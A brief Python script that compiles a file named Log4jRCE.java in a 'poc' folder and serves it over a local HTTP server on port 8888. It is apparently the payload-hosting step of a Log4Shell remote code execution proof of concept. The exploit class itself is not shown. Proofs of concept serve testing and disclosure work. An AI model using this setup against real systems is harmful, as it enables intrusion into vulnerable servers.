#!/usr/bin/env python3

import subprocess
import os

#1. Change Directory to ./poc
os.chdir("./poc/")
#2. Compile Java file to Java Class.
subprocess.run(["javac", "Log4jRCE.java"])
#3. Start python3 http server
subprocess.run(["python3", "-m", "http.server", "8888"])

